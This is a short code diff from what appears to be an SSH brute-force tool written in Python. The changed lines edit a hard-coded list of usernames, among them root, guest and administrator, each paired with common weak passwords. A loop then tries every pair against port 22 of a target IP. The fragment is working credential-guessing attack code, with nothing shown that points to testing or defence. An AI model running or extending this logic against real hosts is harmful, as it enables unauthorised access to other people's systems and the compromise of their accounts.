@@ -46,7 +46,7 @@ class SSHBruteForce():
 
 def d_main(ip):
     sshBruteForce = SSHBruteForce()
-    user_pass_list = {'root': ['fuckyou', 'love', 'god', 'passw0rd', 'sex', 'secret', 'iloveyou'], 'radhey': ['fuckyou', 'love', 'god', 'passw0rd', 'sex', 'secret', 'iloveyou'], 'guest': ['fuckyou', 'love', 'god', 'passw0rd', 'sex', 'secret', 'iloveyou'], 'administrator': ['fuckyou', 'love', 'god', 'passw0rd', 'sex', 'secret', 'iloveyou']}
+    user_pass_list = {'root': ['fuckyou', 'love', 'god', 'passw0rd', 'sex', 'secret', 'iloveyou'], 'mrrobot': ['fuck', 'love', 'god', 'passw0rd', 'sex', 'secret', 'iloveyou'], 'guest': ['fuckyou', 'love', 'god', 'passw0rd', 'sex', 'secret', 'iloveyou'], 'administrator': ['fuckyou', 'love', 'god', 'passw0rd', 'sex', 'secret', 'iloveyou']}
     for user in user_pass_list:
         for passwd in user_pass_list[user]:
             sshBruteForce.createConnection(user,passwd,ip,22,1000)
